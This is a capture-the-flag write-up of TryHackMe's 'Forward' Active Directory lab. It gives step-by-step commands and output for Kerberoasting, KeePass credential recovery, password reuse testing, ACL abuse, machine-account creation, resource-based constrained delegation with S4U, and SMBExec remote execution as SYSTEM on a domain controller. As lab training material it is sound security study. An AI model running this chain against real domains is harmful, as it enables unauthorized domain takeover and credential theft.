---
type: writeup
platform: TryHackMe
room: Forward
os: Windows
environment: Active Directory
last_verified: 2026-09-28

techniques:
  - active-directory-enumeration
  - kerberoasting
  - credential-discovery
  - password-spraying
  - password-reuse
  - acl-abuse
  - machine-account-creation
  - resource-based-constrained-delegation
  - s4u
  - kerberos-ticket-abuse
  - remote-execution

tools:
  - nmap
  - netexec
  - smbclient
  - impacket-GetUserSPNs
  - hashcat
  - xfreerdp
  - keepass2john
  - john
  - ldapsearch
  - impacket-dacledit
  - impacket-addcomputer
  - impacket-rbcd
  - impacket-getST
  - impacket-smbexec
---
**Attack path:** Assumed-breach `j.smith` → KeePass credential discovery → `t.jones` → password reuse → `r.williams` → dangerous ACL on `DC01$` → controlled machine account → RBCD → Administrator CIFS ticket → SMBExec → SYSTEM

## 1. Starting Context and Reconnaissance

The room started as an **assumed-breach** Active Directory scenario with valid credentials for a domain user:

```bash
Domain   : ctf.local
Username : j.smith
Password : JSmith@IT2024
Target   : DC01.ctf.local
```

Initial service enumeration was performed with:

```bash
nmap -sV -sC <TARGET_IP>
```

Relevant services included:

```bash
53/tcp    DNS
88/tcp    Kerberos
135/tcp   RPC
139/tcp   NetBIOS
389/tcp   LDAP
445/tcp   SMB
464/tcp   Kerberos password
636/tcp   LDAPS
3268/tcp  Global Catalog LDAP
3269/tcp  Global Catalog LDAPS
3389/tcp  RDP
```

Nmap also identified:

```bash
Computer : DC01
Domain   : ctf.local
OS       : Windows Server 2019
```

The combination of DNS, Kerberos, LDAP, SMB and Global Catalog services identified the target as an Active Directory Domain Controller.

---

## 2. Validating the Initial Account

The supplied credentials were first validated over SMB:

```bash
netexec smb <TARGET_IP> \
  -u j.smith \
  -p JSmith@IT2024 \
  -d ctf.local
```

Authentication succeeded:

```bash
[+] ctf.local\j.smith:<REDACTED>
```


---

## 3. SMB Share Enumeration

Available shares were enumerated:

```bash
netexec smb <TARGET_IP> \
  -u j.smith \
  -p JSmith@IT2024 \
  -d ctf.local \
  --shares
```

Relevant result:

```bash
ADMIN$
C$
Downloads   READ
IPC$        READ
NETLOGON    READ
SYSVOL      READ
```

`Downloads` was a custom readable share, so it was inspected:

```bash
smbclient //<TARGET_IP>/Downloads \
  -U 'ctf.local/j.smith%<REDACTED>'
```

```bash
smb: \> ls
```

The share was empty.

This path produced no useful files or credentials, so enumeration continued elsewhere.

---

## 4. Active Directory User Enumeration

LDAP enumeration through NetExec revealed domain users:

```bash
netexec ldap <TARGET_IP> \
  -u j.smith \
  -p JSmith@IT2024 \
  -d ctf.local \
  --users
```

Relevant accounts included:

```bash
Administrator
Guest
krbtgt
j.smith
t.jones
r.williams
svc.helpdesk
```

Descriptions provided useful context:

```bash
j.smith       → IT Staff
t.jones       → Help Desk
r.williams    → Help Desk Senior
svc.helpdesk  → HelpDesk Service Acct
```

The `svc.helpdesk` account was particularly interesting because service accounts commonly have Service Principal Names associated with them.

---

## 5. Kerberoasting `svc.helpdesk`

SPNs were enumerated with Impacket:

```bash

GetUserSPNs.py \
  -dc-ip <TARGET_IP> \
  'ctf.local/j.smith:JSmith@IT2024'

Options:
GetUserSPNs.py                    Impacket tool used to enumerate AD accounts with Service Principal Names
-dc-ip <TARGET_IP>               specify the Domain Controller / KDC IP address
ctf.local/j.smith:<PASSWORD>     authenticate to the domain using j.smith credentials
```

Relevant result:

```bash
helpdesk/DC01
helpdesk/DC01.ctf.local

Account    : svc.helpdesk
Delegation : constrained
```

Because `svc.helpdesk` had an SPN, an authenticated domain user could request a Kerberos service ticket for it.

A Kerberoasting attempt was therefore performed:

```bash
GetUserSPNs.py \
  -dc-ip <TARGET_IP> \
  -request \
  -outputfile helpdesk.hash \
  'ctf.local/j.smith:<REDACTED>'
```

The captured ticket had the form:

```bash
$krb5tgs$23$*svc.helpdesk$CTF.LOCAL$...
```

The ticket was attacked with Hashcat using mode `13100`:

```bash
hashcat -m 13100 helpdesk.hash /usr/share/wordlists/rockyou.txt
```

Result:

```bash
Status...........: Exhausted
Recovered........: 0/1
```

The Kerberoasting technique worked, but the service account password was not present in `rockyou.txt`.

Instead of spending more time on an arbitrary cracking attempt, this path was abandoned and enumeration continued.

---

## 6. RDP Access as `j.smith`

RDP was exposed on port `3389`, so the account was tested:

```bash
netexec rdp <TARGET_IP> \
  -u j.smith \
  -p '<REDACTED>' \
  -d ctf.local
```

The account had RDP access.

An interactive session was opened:

```bash
xfreerdp \
  /v:<TARGET_IP> \
  /u:j.smith \
  /p:'<REDACTED>' \
  /d:ctf.local \
  /cert:ignore \
  +clipboard \
  /dynamic-resolution
```

The Windows identity was verified:

```powershell
whoami

ctf\j.smith
```

Group membership was also inspected:

```powershell
whoami /groups


Relevant memberships included:

BUILTIN\Remote Desktop Users
CTF\AppLocker-Restricted
```

The user profile was then examined:

```powershell
dir C:\Users\j.smith\Documents
```

A KeePass database was discovered:

```bash
Database.kdbx
```

---

## 7. KeePass Database Analysis

The first approach was to try to recover the KeePass master password offline.

The database was copied to the attacker machine and converted:

```bash
keepass2john Database.kdbx > keepass.hash
```

The resulting hash began with:

```bash
Database:$keepass$*4*600000*...
```

John was then tested with `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
```

The database used:

```bash
600000 rounds
```

and cracking proceeded at approximately:

```bash
~94 passwords/second
```

At that rate, completing the selected wordlist would take far longer than the lab duration.

This made offline cracking an inefficient path.

### Using the Windows Account Instead

KeePass was installed on `DC01`, so the database was opened directly from:

```bash
C:\Users\j.smith\Documents\Database.kdbx
```

The database allowed the use of:

```text
Windows User Account
```

Because the current Windows session was already running as:

```bash
ctf\j.smith
```

the database could be unlocked through the Windows user-account component instead of recovering the master password.

The database contained credentials for:

```bash
t.jones
```

Public version:

```bash
Username: t.jones
Password: <REDACTED>
```

---

## 8. Compromising `t.jones`

The recovered credential was validated over SMB:

```bash
netexec smb <TARGET_IP> \
  -u t.jones \
  -p '<REDACTED>' \
  -d ctf.local
```

Authentication succeeded:

```bash
[+] ctf.local\t.jones:<REDACTED>
```

This confirmed that the KeePass entry contained a valid reusable domain credential.

---

## 9. Checking the Password Policy

Before testing the recovered password against other users, the domain password policy was inspected:

```bash
netexec smb <TARGET_IP> \
  -u t.jones \
  -p '<REDACTED>' \
  -d ctf.local \
  --pass-pol
```

Relevant result:

```bash
Account Lockout Threshold: None
```

No automatic account lockout threshold was configured.

This mattered because the next test involved checking whether the newly recovered password had been reused by other known accounts.

---

## 10. Password Reuse → `r.williams`

A short user list was created:

```bash
printf "j.smith\nt.jones\nr.williams\n" > users.txt
```

The known password was then tested across those accounts:

```bash
netexec smb <TARGET_IP> \
  -u users.txt \
  -p '<REDACTED>' \
  -d ctf.local \
  --continue-on-success
```

Relevant result:

```bash
[-] j.smith:<REDACTED>      STATUS_LOGON_FAILURE
[+] t.jones:<REDACTED>
[+] r.williams:<REDACTED>
```

The same password was therefore valid for both:

```bash
t.jones
r.williams
```

This moved access from the Help Desk account `t.jones` to the more interesting `r.williams` account.

---

## 11. Dangerous ACL on `DC01$`

The next step was to inspect the Active Directory permissions held by `r.williams` over the Domain Controller computer object:

```bash
dacledit.py \
  -action read \
  -principal r.williams \
  -target 'DC01$' \
  -dc-ip <TARGET_IP> \
  'ctf.local/r.williams:<REDACTED>'

Options:
dacledit.py                         Impacket tool used to inspect or modify Active Directory ACLs
-action read                        read the permissions instead of modifying them
-principal r.williams              inspect permissions granted to r.williams
-target 'DC01$'                    target the Domain Controller computer object
-dc-ip <TARGET_IP>                 specify the Domain Controller IP address
ctf.local/r.williams:<PASSWORD>    authenticate using r.williams domain credentials
```

The important ACE was:

```bash
ACE Type    : ACCESS_ALLOWED_OBJECT_ACE
Access mask : WriteProperty

Object type :
ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity

Trustee :
r.williams
```

The important relationship was therefore:

```text
r.williams
      ↓
WriteProperty
      ↓
msDS-AllowedToActOnBehalfOfOtherIdentity
      ↓
DC01$
```

`DC01$` is the Active Directory computer object representing the Domain Controller.

The permission allowed `r.williams` to modify the attribute used by **Resource-Based Constrained Delegation**.

---

## 12. Resource-Based Constrained Delegation

RBCD uses the attribute:

```bash
msDS-AllowedToActOnBehalfOfOtherIdentity
```

to define which security principals may act on behalf of other users when accessing the target computer.

Because `r.williams` could modify that attribute on `DC01$`, the account could make the Domain Controller trust an attacker-controlled Kerberos identity for delegation.

The attack therefore required an identity controlled by the attacker.

---

## 13. MachineAccountQuota

The domain's MachineAccountQuota was queried:

```bash
ldapsearch -x \
  -H ldap://<TARGET_IP> \
  -D 'r.williams@ctf.local' \
  -w '<REDACTED>' \
  -b 'DC=ctf,DC=local' \
  -s base \
  ms-DS-MachineAccountQuota
```

Result:

```bash
ms-DS-MachineAccountQuota: 10
```

This allowed a standard domain user to create machine accounts.

A controlled computer account could therefore be created for the RBCD chain.

---

## 14. Creating a Controlled Machine Account

A new machine account was created:

```bash
addcomputer.py \
  -computer-name 'ATTACKER$' \
  -computer-pass '<REDACTED>' \
  -dc-ip <TARGET_IP> \
  'ctf.local/r.williams:<REDACTED>'
```

Result:

```bash
Successfully added machine account ATTACKER$
```

The attacker now controlled a Kerberos-enabled identity:

```bash
ATTACKER$
```

with a known password.

---

## 15. Configuring RBCD

The current delegation configuration on `DC01$` was inspected first:

```bash
rbcd.py \
  -delegate-to 'DC01$' \
  -action read \
  -dc-ip <TARGET_IP> \
  'ctf.local/r.williams:<REDACTED>'

Options:
rbcd.py                            Impacket tool used to inspect or modify Resource-Based Constrained Delegation
-delegate-to 'DC01$'               target the DC01 computer object
-action read                       read the current RBCD configuration
-dc-ip <TARGET_IP>                 specify the Domain Controller IP address
ctf.local/r.williams:<PASSWORD>    authenticate using r.williams domain credentials
```

Result:

```bash
msDS-AllowedToActOnBehalfOfOtherIdentity is empty
```

The controlled machine account was then granted delegation rights:

```bash
rbcd.py \
  -delegate-from 'ATTACKER$' \
  -delegate-to 'DC01$' \
  -action write \
  -dc-ip <TARGET_IP> \
  'ctf.local/r.williams:<REDACTED>'
```

Result:

```bash
Delegation rights modified successfully!

ATTACKER$ can now impersonate users
on DC01$ via S4U2Proxy
```

The trust relationship was now:

```text
ATTACKER$
    │
    │ allowed through RBCD
    ▼
DC01$
```

---

## 16. Impersonating Administrator with S4U

The objective was to obtain a Kerberos service ticket representing:

```bash
Administrator
```

for:

```bash
cifs/DC01.ctf.local
```

The Domain Controller hostname was first made resolvable:

```bash
echo '<TARGET_IP> DC01.ctf.local DC01' >> /etc/hosts
```

A service ticket was then requested with the controlled machine account:

```bash
getST.py \
  -dc-ip <TARGET_IP> \
  -spn cifs/DC01.ctf.local \
  -impersonate Administrator \
  'ctf.local/ATTACKER$:<REDACTED>'
```

Relevant output:

```bash
Getting TGT for user
Impersonating Administrator
Requesting S4U2self
Requesting S4U2Proxy

Saving ticket in:
Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

The request used the two S4U stages involved in the delegation chain.

`S4U2Self` allowed the controlled service identity to obtain a ticket representing Administrator.

`S4U2Proxy` then used the RBCD configuration to request access to the permitted service:

```bash
cifs/DC01.ctf.local
```

The result was a service ticket with:

```bash
User    : Administrator
Service : cifs/DC01.ctf.local
```

without knowing the Administrator password.

---

## 17. Loading the Kerberos Ticket

The generated cache was selected through `KRB5CCNAME`:

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

The active tickets could be checked with:

```bash
klist
```

At this point, authentication no longer depended on an Administrator password; the required Kerberos service ticket was already available.

---

## 18. Remote Execution → SYSTEM

The Administrator CIFS ticket was used with Impacket's SMBExec:

```bash
smbexec.py \
  -k \
  -no-pass \
  ctf.local/Administrator@DC01.ctf.local

Options:
-k        use Kerberos authentication
-no-pass  use the loaded ticket instead of requesting a password
```

The hostname matched the service ticket:

```bash
cifs/DC01.ctf.local
```

Remote execution succeeded and the resulting context was verified:

```cmd
whoami

nt authority\system
```

The final Administrator flag was then accessible:

```cmd
type C:\Users\Administrator\Desktop\flag.txt

THM{REDACTED}
```

---

## Key Takeaways

- Valid attack paths should still be abandoned when their practical cost becomes unreasonable. Both Kerberoasting and KeePass cracking were technically valid here, but neither produced a useful result within the lab constraints.
- Credentials stored in a user's local password database can enable lateral movement even when the compromised account itself is not privileged.
- Password reuse can turn one recovered credential into access to a more valuable account; checking the lockout policy first reduces unnecessary risk when testing reuse.
- Active Directory privilege is not limited to privileged-group membership. Object ACLs can grant highly sensitive capabilities to otherwise ordinary accounts.
- RBCD becomes exploitable when an attacker controls a Kerberos identity and can modify `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer object.
- MachineAccountQuota provided the controlled machine identity required for the RBCD chain.
- S4U2Self and S4U2Proxy allowed the controlled machine account to obtain an Administrator service ticket for CIFS without knowing the Administrator password.